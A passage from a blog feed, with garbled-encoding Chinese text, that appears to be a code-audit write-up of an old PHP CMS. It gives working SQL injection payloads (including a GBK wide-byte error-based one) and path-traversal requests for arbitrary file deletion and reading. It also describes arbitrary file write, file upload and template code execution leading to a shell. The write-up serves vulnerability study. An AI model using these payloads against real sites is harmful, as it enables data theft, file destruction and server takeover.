class="number">32</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">66</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">33</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282200592.png" alt="image-20230828220042515"></p><h2 id="BookAction-class-php‰∏ãÁöÑsqlÊ≥®ÂÖ•"><a href="#BookAction-class-php‰∏ãÁöÑsqlÊ≥®ÂÖ•" class="headerlink" title="BookAction.class.php‰∏ãÁöÑsqlÊ≥®ÂÖ•"></a>BookAction.class.php‰∏ãÁöÑsqlÊ≥®ÂÖ•</h2><p>Êù•Âà∞Êñá‰ª∂‰∏ãÂØªÊâæ‰º†ÂèÇ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282200891.png" alt="image-20230828220058846"><br>ËøôÈáåË∞ÉÁî®‰∫ÜaddÊñπÊ≥ïÔºåËøô‰∏™ÊñπÊ≥ïÂ∫ïÂ±ÇÊâßË°å‰∫ÜsqlÔºåË∑üËøõÂéªÂç≥ÂèØÁúãÂà∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282201047.png" alt="image-20230828220119000"><br>ÂêåÊ†∑ËæìÂá∫‰∏Ä‰∏ãsqlËØ≠Âè•ÔºåÁÑ∂ÂêéÊääËÆøÈóÆË¶ÅÁöÑÂèÇÊï∞Âä†‰∏äÂÖàÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282201883.png" alt="image-20230828220142810"><br>ËÆøÈóÆÊàêÂäüÔºåÊé•‰∏ãÊù•Â∞±ÂéªÊâæÊ≥®ÂÖ•ÔºåÁõ¥Êé•Êù•Âà∞Â∫ïÂ±ÇÁöÑsqlËØ≠Âè•ÊâßË°åÁöÑÂú∞ÊñπÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282201268.png" alt="image-20230828220157226"><br>ÂèëÁé∞ÂØπËøô‰∏™keyÊ≤°Êúâ‰ªª‰ΩïÂ§ÑÁêÜÁõ¥Êé•ËøõË°å‰∫ÜÊãºÊé•ÔºåÊù•Âà∞pÂáΩÊï∞‰∏ãÁúãÁúã‰πüÊ≤°Áî®‰ªª‰ΩïÁöÑÂ§ÑÁêÜÂè™ÊòØÂØπ<code>$v</code>Êìç‰ΩúÔºåÂåÖÊã¨<code>filter_sql</code>ÂáΩÊï∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282202533.png" alt="image-20230828220214466"><br>ÁÑ∂ÂêéÊîπ‰∏Ä‰∏ãkeyÁúãËÉΩ‰∏çËÉΩÊ≥®ÂÖ•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282202469.png" alt="image-20230828220229390"><br>ÂèëÁé∞Ê≤°ÊúâÊä•ÈîôÔºåËøôÊ†∑‰ª£Ë°®Â∞±Ê≥®ÂÖ•ËøõÂéª‰∫ÜÔºåÊù•Âà∞È°µÈù¢ÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282202773.png" alt="image-20230828220253722"><br>ÂàöÂàöÊ≥®ËøõÂéªÁöÑÂèÇÊï∞Âπ∂Ê≤°ÊúâÂõûÊòæÂá∫Êù•ÔºåÂè™Êúâ‰∏Ä‰∫õÁ≥ªÁªüÈªòËÆ§ÊîæÁöÑ‰∏úË•øÔºåÊù•Âà∞Êï∞ÊçÆÂ∫ìÈáåÊü•ÁúãË°®ÁöÑÁªìÊûÑÔºåÁúãÁúã‰∏∫‰ªÄ‰πàÊòØËøôÊ†∑ÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282203353.png" alt="image-20230828220311302"><br>ÂèØ‰ª•ÁúãÂà∞Êúâ‰∏™ischeckÊòæÁ§∫‰∏∫1Êâç‰ºöÂõûÊòæÔºåÈÇ£‰πàËÆæÁΩÆ‰∏Ä‰∏ãËøô‰∏™key‰∏∫1<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282203204.png" alt="image-20230828220323149"><br>ÂèØ‰ª•ÁúãÂà∞ÂõûÊòæÊàêÂäüÔºåÊé•‰∏ãÊù•ÊûÑÈÄ†payloadÊ≥®ÂÖ•Â∞±Ë°å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setbook<span class="operator">=</span>a<span class="operator">&amp;</span>name<span class="operator">=</span>e<span class="operator">&amp;</span>content<span class="operator">=</span>b<span class="operator">&amp;</span>mail<span class="operator">=</span>c<span class="operator">&amp;</span>tel<span class="operator">=</span>d<span class="operator">&amp;</span><span class="type">time</span>,ischeck)<span class="keyword">values</span>(version(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>)#<span class="operator">=</span>a</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282203099.png" alt="image-20230828220345049"></p><h2 id="SearchAction-class-php‰∏ãÁöÑÊ≥®ÂÖ•"><a href="#SearchAction-class-php‰∏ãÁöÑÊ≥®ÂÖ•" class="headerlink" title="SearchAction.class.php‰∏ãÁöÑÊ≥®ÂÖ•"></a>SearchAction.class.php‰∏ãÁöÑÊ≥®ÂÖ•</h2><p>Ëøô‰∏™Ê≥®ÂÖ•Êú¨Êù•Ê≤°ÊâìÁÆóÂÜôÁöÑÔºåÂõ†‰∏∫ÊòØÁõ≤Ê≥®‰∏îËøáÊª§‰∫Ü<code>&#39;</code>Âíå‰∏Ä‰∫õÂÖ≥ÈîÆÂ≠óÔºåÊâÄ‰ª•ÂæàÂ§öÊü•ËØ¢Ê†πÊú¨Áî®‰∏ç‰∫ÜÔºå‰ΩÜÊòØÂ¶ÇÊûúÊîπ‰∫ÜÊï∞ÊçÆÂ∫ìÁöÑÈÖçÁΩÆ‰∏∫gbkÁºñÁ†ÅÈÇ£‰πàÂèØ‰ª•Áî®ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•Êù•ÁªïËøáÔºåÂπ≥Êó∂Ê≤°ÊÄé‰πàÊé•Ëß¶ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•ÊâÄ‰ª•Êù•Áúã‰∏Ä‰∏ãÔºåËøô‰∏™Âú∞ÊñπÁöÑÂäüËÉΩÂÖ∂ÂÆûÂ∞±ÊòØÂâçÂè∞ÁöÑÈÇ£‰∏™ÊêúÁ¥¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282204326.png" alt="image-20230828220407106"><br>ÁÑ∂ÂêéÁúã‰∏Ä‰∏ãÊ∫êÁ†ÅÊâæÂà∞sqlËØ≠Âè•ÁÖßÊ†∑ËæìÂá∫ÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282204543.png" alt="image-20230828220424495"><br>Âú®searchCoutnÈáåÈù¢‰∏ÄË∑ØË∑üËøõÂéªÂ∞±Ë°å‰∫ÜÔºåÁÑ∂ÂêéÂèØ‰ª•ÁúãÂà∞keywordsÁöÑaË¢´ÂçïÂºïÂè∑ÂåÖË£π‰∫ÜÁÑ∂ÂêéÂºïÂè∑ÂèàË¢´ËøáÊª§‰∫ÜÂ∞±ÂæàÈöæÁî®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282204208.png" alt="image-20230828220456144"><br>ÁÑ∂ÂêéÊúÄÁªàÊâæÂà∞‰∏Ä‰∏™ÂèÇÊï∞tuijianÈÄöËøáÊä•ÈîôÂèëÁé∞ÊòØÂàóÂêçÔºåÈÇ£‰πàÂ∞±‰∏çÂ≠òÂú®ÊúâÂçïÂºïÂè∑‰ªÄ‰πàÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282205494.png" alt="image-20230828220510418"><br>ÁÑ∂ÂêéÊ≥®ÂÖ•‰∏Ä‰∏ãÂèëÁé∞ÂÆÉÁöÑcontent-LengthÂèò‰∫ÜËØ¥ÊòéÊ≥®ÂÖ•ÊàêÂäüÔºåÂú®Ê≤°ÊúâÊ≥®ÂÖ•ÊàêÂäüÁöÑÊó∂ÂÄôÈïøÂ∫¶ÊòØ5000Â§ö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282205131.png" alt="image-20230828220530071"><br>ÁÑ∂ÂêéÊ≥®‰∏Ä‰∏ãmysqlÁöÑÁâàÊú¨Á¨¨‰∏Ä‰ΩçÊï∞Â≠óÔºå‰∏∫5Ê≥®ÂÖ•ÊàêÂäüÔºåÁúüË¶ÅÊ≥®ÁöÑËØù‰πüÂèØ‰ª•ÂÜôËÑöÊú¨ËøõË°åÊ≥®ÂÖ•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282205455.png" alt="image-20230828220550381"><br>‰ΩÜÊòØËøôÈáå‰æùÊóßÁî®‰∏ç‰∫ÜselectÁ≠âÂÖ≥ÈîÆÂ≠óÔºåÊ≥®‰∏çÂá∫Êù•ÂæàÊúâÁî®ÁöÑ‰ø°ÊÅØÔºå‰ΩÜÊòØËøô‰∏™ÂÖ≥ÈîÆÂ≠êÂÖ∂ÂÆûÂèØ‰ª•ÁªïËøáÔºåÂõ†‰∏∫Âú®ÊâßË°å‰∫ÜpÂáΩÊï∞‰πãÂêéÊúâ‰∏™<code>string::delHtml</code>Ëøô‰∏™<code>delHtml</code>ÊñπÊ≥ï‰ºöÊ∏ÖÈô§‰∏Ä‰∫õhtmlÊ†áÁ≠æÂ¶Ç<code>&lt;&gt;</code>ÊâÄ‰ª•ÂèØ‰ª•Âà©Áî®Ëøô‰∏™ÁªïËøáÔºå‰πãÊâÄ‰ª•‰∏äÈù¢ÁöÑÊ≥®ÂÖ•‰∏çÁî®ÊòØÂõ†‰∏∫Êó†Ê≥ïÁªïËøáÂçïÂºïÂè∑Ôºå‰ΩÜÊòØÂ¶ÇÊûúÁ≥ªÁªüÁî®‰∫ÜGBKÁºñÁ†ÅÂ∞±ÂèØ‰ª•‰ΩøÁî®ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•‰∫ÜÔºåÂΩìÁÑ∂ÂæàÂ∞ëÊúâ‰∫∫ÂéªÊîπÈÖçÁΩÆÔºåËøô‰∏™Ê¢¶ÊÉ≥CMSÈªòËÆ§ÊòØutf8ËøôÈáå‰∏∫‰∫ÜÂ≠¶‰π†‰∏ãÊâÄ‰ª•ÁªôÂÆÉÊîπ‰∫ÜËØïËØï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282206858.png" alt="image-20230828220646802"><br>ÁÑ∂ÂêéÊûÑÈÄ†Êä•ÈîôÊ≥®ÂÖ•ÁöÑpayloadÂ¶Ç‰∏ã</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="operator">%</span>df<span class="string">&#x27;)or+upd&lt;&gt;atexml(0,concat(0x7e,us&lt;&gt;er()),1)%23</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207167.png" alt="image-20230828220704108"></p><h2 id="BackdbAction-class-php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂Âà†Èô§"><a href="#BackdbAction-class-php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂Âà†Èô§" class="headerlink" title="BackdbAction.class.php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂Âà†Èô§"></a>BackdbAction.class.php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂Âà†Èô§</h2><p>Âà†Èô§Êñá‰ª∂‰∏ÄËà¨ÈÉΩÊòØunlinkÔºåÊâÄ‰ª•Â¶ÇÊûúÊòØËá™Â∑±ÊâæÁöÑËØùÂ∞±Áõ¥Êé•ÊâæËøô‰∏™ÔºåËøôÈáåÊàëË∑üÁùÄÁªÑÈïøÁõ¥Êé•ÊâæÊºèÊ¥ûÁÇπ‰∫ÜÔºåÂú®BackdbAction.class.php‰∏ãÊâæÂà∞delOneÂáΩÊï∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207193.png" alt="image-20230828220722152"><br>ÂèØ‰ª•ÁúãÂà∞ÊòéÊòæÁöÑ‰ªªÊÑèÊñá‰ª∂Âà†Èô§Ê≤°Êúâ‰ªª‰ΩïÁöÑËøáÊª§Âï•ÁöÑÔºåÁé∞Âú®ÊâæÂà∞filenameÂèÇÊï∞ÊÄé‰πàÂæóÂà∞ÔºåÊúÄÁªàÊòØÂú®delbackdbÂáΩÊï∞‰∏ãÈÄöËøáGET‰º†ÂèÇÂæóÂà∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207179.png" alt="image-20230828220734143"><br>ËøôÈáåÂÆÉÊ£ÄÊµãÁöÑÁ´üÁÑ∂ÊòØËøô‰∏™ÂèÇÊï∞‰∏çÂ≠òÂú®ÁöÑËØùÊòæÁ§∫Â§á‰ªΩÊñá‰ª∂‰∏çÂ≠òÂú®ÔºåËÄå‰∏çÊòØÁúüÊ≠£ÁöÑÊñá‰ª∂‰∏çÂ≠òÂú®ÊòæÁ§∫Â§á‰ªΩÊñá‰ª∂‰∏çÂ≠òÂú®ÔºåÁé∞Âú®ÊûÑÈÄ†‰∏Ä‰∏ãpayloadËØï‰∏Ä‰∏ãÔºåÈ¶ñÂÖàÂú®ÁΩëÁ´ô Ê†πÁõÆÂΩïÂª∫‰∏™<code>flag.txt</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207426.png" alt="image-20230828220747353"><br>payloadÂ¶Ç‰∏ãÔºåËøôÈáåÈúÄË¶ÅÂÅö‰∏Ä‰∏ãÁõÆÂΩïÁ©øË∂äÂõ†‰∏∫filenameÊòØÊãºÊé•Âú®file&#x2F;back&#x2F;ÂêéÈù¢ÁöÑ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=backdb&amp;a=delbackdb&amp;filename=../../flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208385.png" alt="image-20230828220802316"><br>ÊàêÂäüÂà†Èô§</p><h2 id="TemplateAction-class-php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ"><a href="#TemplateAction-class-php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ" class="headerlink" title="TemplateAction.class.php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ"></a>TemplateAction.class.php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ</h2><p>Ëøô‰∏™ÊºèÊ¥ûÂú®cnvdÊ≤°ÊúâÂÖ¨ÂºÄÊñá‰ª∂ÂêçÁöÑ‰ªª‰ΩïÂ≠óÊØçÔºå‰πüÊ≤°ÊúâËØ¥ÊòØÂâçÂè∞ÂêéÂè∞ÔºåÊâÄ‰ª•ÂÅöÂ§çÁé∞Áõ∏ÂΩì‰∫éÂëäËØâ‰Ω†Ëøô‰∏™Á≥ªÁªüÊúâËøô‰∏™Ê¥ûÔºåÁÑ∂Âêé‰Ω†Ëá™Â∑±ÂéªÊâæÔºåËøôÊ†∑ÂÖ∂ÂÆûÈöæÂ∫¶Â∞±ÊØîËæÉÂ§ß‰∫Ü<br>‰ªªÊÑèÊñá‰ª∂ËØªÂèñÂà©Áî®ÁöÑÂÖ∂ÂÆûÂ∞±ÊòØ<code>file_get_contents</code>Ëøô‰∏™ÂáΩÊï∞ÔºåÈÇ£‰πàÂ∞±ÂÖ®Â±ÄÊêúÁ¥¢Ëøô‰∏™ÂáΩÊï∞ÁúãÁúãÂì™ÈáåË∞ÉÁî®‰∫ÜÔºåÁÑ∂Âêé‰∏Ä‰∏™‰∏™ÂÆ°ÔºåÊúÄÁªàÊòØÂú®file.class.phpÊñá‰ª∂‰∏ãÁöÑ<code>getcon</code>ÂáΩÊï∞Ë∞ÉÁî®‰∫Ü<code>file_get_contents</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208404.png" alt="image-20230828220820339"><br>Áõ∏ÂΩì‰∫éÈáçÂÜô‰∫Ü‰∏Ä‰∏ã<code>file_get_contents</code>ÊñπÊ≥ïÔºåÈáåÈù¢‰πüÊ≤°Âï•ËøáÊª§ÔºåÂè™ÊòØÊ£ÄÊü•‰∫Ü‰∏Ä‰∏ãÊùÉÈôêÔºåÁÑ∂ÂêéÊâæÂì™ÈáåË∞ÉÁî®‰∫Ü<code>getcon</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208072.png" alt="image-20230828220833999"><br>Â∞±‰∏ÄÂ§ÑË∞ÉÁî®‰∫ÜÂú®TemplateAction.class.php‰∏ãÁöÑ<code>editfile</code>ÂáΩÊï∞‰∏≠<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208676.png" alt="image-20230828220844602"><br>Êé•Êî∂‰∏Ä‰∏™dirÂèÇÊï∞ÁÑ∂ÂêéÊãºÊé•Âú®templateÂêéÈù¢ÔºåÈÇ£‰πàÁé∞Âú®Â∞±ÂèØ‰ª•ÊûÑÈÄ†payloadÂ∞ùËØïËØªÂèñ‰∏Ä‰∏ã‰∫Ü</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=template&amp;a=editfile&amp;dir=../index.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209018.png" alt="image-20230828220859955"><br>ÊàêÂäüËØªÂèñ</p><h2 id="TemplateAction-class-php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•"><a href="#TemplateAction-class-php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•" class="headerlink" title="TemplateAction.class.php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•"></a>TemplateAction.class.php‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•</h2><p>Â∞±Âú®ÂàöÂàöÈÇ£‰∏™<code>editfile</code>ÂáΩÊï∞‰∏ãËøòÂ≠òÂú®‰∏Ä‰∏™‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209112.png" alt="image-20230828220910054"><br>Êé•Êî∂‰∏Ä‰∏™settemcontentÂèÇÊï∞ËøõÂÖ•ifÔºåÁÑ∂ÂêéfilenameÔºåÁÑ∂ÂêéÊñá‰ª∂ÂÜÖÂÆπtemcontent<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209048.png" alt="image-20230828220923970"><br>ÁÑ∂ÂêéËÆøÈóÆ1.phpÔºåÂèëÁé∞ÊàêÂäüÂÜôÂÖ•ÔºåËøôÊ†∑ÂèØ‰ª•Áõ¥Êé•getshell‰∫ÜÔºåËøô‰∏™Â∞±ÊúâÁÇπ‰ª£Á†ÅÂÆ°ËÆ°ÁöÑÊÑèÊÄù‰∫ÜÔºåÁúã‰∫Ü‰∏ãÂú®ÈªëÁõí‰∏ãÊâæÂà∞ËøòÊòØÊØîËæÉÂõ∞Èöæ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209711.png" alt="image-20230828220934594"></p><h2 id="ÈªëÁõí‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†"><a href="#ÈªëÁõí‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†" class="headerlink" title="ÈªëÁõí‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†"></a>ÈªëÁõí‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†</h2><p>Ëøô‰∏™Â∞±ÊòØÈªëÁõí‰∏ãÁöÑÊñá‰ª∂‰∏ä‰º†ÔºåÁõ¥Êé•ÁôΩÁõíÂÆ°ÁöÑËØùÂÖ∂ÂÆûÊØîÈªëÁõíÈöæ<br>Âú®ÂÜÖÂÆπÁÆ°ÁêÜ‰∏ãÊâæÂà∞‰∏ÄÂ§ÑÊñá‰ª∂‰∏ä‰º†ÁöÑÂú∞Êñπ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209374.png" alt="image-20230828220958303"><br>‰ΩÜÊòØÁî±‰∫éÁâàÊú¨ÊØîËæÉËÄÅÔºåÊñ∞ÁâàÊú¨ÁöÑedge‰∏çÊîØÊåÅÁÇπÂáª‰∫ÜÔºåÂ¶Ç‰∏ãÈÄâÊã©Êñá‰ª∂ÂíåÂºÄÂßã‰∏ä‰º†Ê†πÊú¨ÁÇπ‰∏ç‰∫ÜÔºåËøôÈáåÂèØ‰ª•Áî®flashÊù•ËÆøÈóÆÔºåÊàñËÄÖËá™Â∑±ÊûÑÈÄ†‰∏ä‰º†ÂåÖÔºåÂè¶Â§ñÊîØÊåÅÁöÑ‰∏ä‰º†Ê†ºÂºè‰πüÂèØ‰ª•ÁúãÂà∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210839.png" alt="image-20230828221014803"><br>ÊâæÊâæÂì™ÈáåËÉΩ‰øÆÊîπÔºåÊâæÂà∞Â¶Ç‰∏ã‰ΩçÁΩÆÔºåÂ∞ÜphpÂä†‰∏ä<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210620.png" alt="image-20230828221025557"><br>ÁÑ∂ÂêéflashËÆøÈóÆ‰∏ä‰º†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210989.png" alt="image-20230828221037936"><br>emmmÊâæ‰∫ÜÂçäÂ§©Ë∑ØÂæÑÂæóÊääÂàöÂàöÂæóÂõæÁâáÈÄâÊã©Êâç‰ºöÊòæÁ§∫Ë∑ØÂæÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210022.png" alt="image-20230828221048958"><br>Á°ÆÂÆöÈÄâÊã©‰πãÂêéÂæóÂà∞Ë∑ØÂæÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282211966.png" alt="image-20230828221102313"><br>ÊàêÂäü‰∏ä‰º†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282211166.png" alt="image-20230828221135089"></p><h2 id="TemplateAction-class-php‰∏ãÁöÑ‰ªªÊÑè‰ª£Á†ÅÊâßË°å"><a href="#TemplateAction-class-php‰∏ãÁöÑ‰ªªÊÑè‰ª£Á†ÅÊâßË°å" class="headerlink" title="TemplateAction.class.php‰∏ãÁöÑ‰ªªÊÑè‰ª£Á†ÅÊâßË°å"></a>TemplateAction.class.php‰∏ãÁöÑ‰ªªÊÑè‰ª£Á†ÅÊâßË°å</h2><p>ËøôÈáå‰πüÁõ¥Êé•ÈªëÁõí‰∏ãÁúãÂêßÔºåÊØîËæÉÁÆÄÂçï<br>Ëøô‰∏™Á≥ªÁªüÁî®ÁöÑsmartyÊ®°ÊùøÔºåÊ≠£Â•ΩÂú®Ëøô‰∏™ÈáåÈù¢Â≠òÂú®‰ª£Á†ÅÊâßË°åÔºåÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282211199.png" alt="image-20230828221156132"><br>ÁÑ∂ÂêéËÆøÈóÆÂâçÂè∞ÂèëÁé∞ÊàêÂäüÊâßË°å‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282212192.png" alt="image-20230828221211141"><br>Âè¶Â§ñÂú®AcquisiAction.class.phpÊúâ‰ª£Á†ÅÊâßË°åÔºåÂà©Áî®ÁöÑÊòØevalÂáΩÊï∞ÔºåÂèØ‰ª•Ëá™Â∑±Ë∑ü‰∏Ä‰∏ãÔºåËøô‰∏™ÁúãÁªÑÈïøËßÜÈ¢ëÊ≤°Ë∑ü‰∫ÜÈùûÂ∏∏ÁªïÔºåÂπ∂‰∏îËøô‰∏™ÁâàÊú¨‰πüÊØîËæÉËÄÅ‰∫ÜÔºåÁ≠âÂêéÈù¢Êù•ÂÖ¥Ë∂£‰∫ÜÊàëÂÜçËá™Â∑±Ë∑üÂêßÔºåËøô‰∏™Á≥ªÁªüËÇØÂÆöÊòØÂæàÂ§öÊ¥ûÁöÑÔºåÁõÆÂâçÊúÄÊñ∞ÁâàÊú¨Âú®41ÔºåÂèØ‰ª•ÂéªÂÆ°‰∏Ä‰∏ã0day</p><h2 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h2><p>ÁôΩÊó•Ê¢¶ÁªÑÈïøyyds<br><a href="https://www.bilibili.com/video/BV1yq4y1s7h6/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1yq4y1s7h6/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> ‰ª£Á†ÅÂÆ°ËÆ° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson1.2.62-1.2.68ÁªïËøá</title>
      <link href="/2023/08/Fastjson1-2-62-1-2-68%E7%BB%95%E8%BF%87/"/>
      <url>/2023/08/Fastjson1-2-62-1-2-68%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="1-2-62ÊºèÊ¥ûÂàÜÊûê"><a href="#1-2-62ÊºèÊ¥ûÂàÜÊûê" class="headerlink" title="1.2.62ÊºèÊ¥ûÂàÜÊûê"></a>1.2.62ÊºèÊ¥ûÂàÜÊûê</h2><h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>Â≠¶ÁöÑËøáÁ®ãÂèëÁé∞Êúâ‰∫õ‰æùËµñÂØºÂÖ•ÁúüÁöÑÊÖ¢ÔºåÊâÄ‰ª•ËøôÈáåÁõ¥Êé•ÊääÊï¥‰∏™pom.xmlË¥¥Âá∫Êù•ÂèØ‰ª•‰∏ÄÊ¨°ÊÄßÂØºÂÆåÁÆó‰∫ÜÔºåÁúãËá™Â∑±ÈÄâÊã©</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 